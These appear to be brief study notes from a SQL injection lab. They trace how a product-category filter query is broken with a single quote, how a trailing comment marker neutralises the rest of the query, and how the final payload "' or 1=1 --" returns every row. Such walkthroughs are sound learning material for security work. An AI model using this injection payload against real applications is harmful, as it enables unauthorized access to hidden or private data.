SELECT * FROM products WHERE category = 'Gifts' AND released = 1

when you had change the query to = '
=> SELECT * FROM products WHERE category = '' ' AND released = 1
it breaks the backend

so you add -- after
=> SELECT * FROM products WHERE category = '' --' AND released = 1
doesn't break the app but return nothing

=> SELECT * FROM products WHERE category = '' or 1=1 --

Final query = ' or 1=1 --
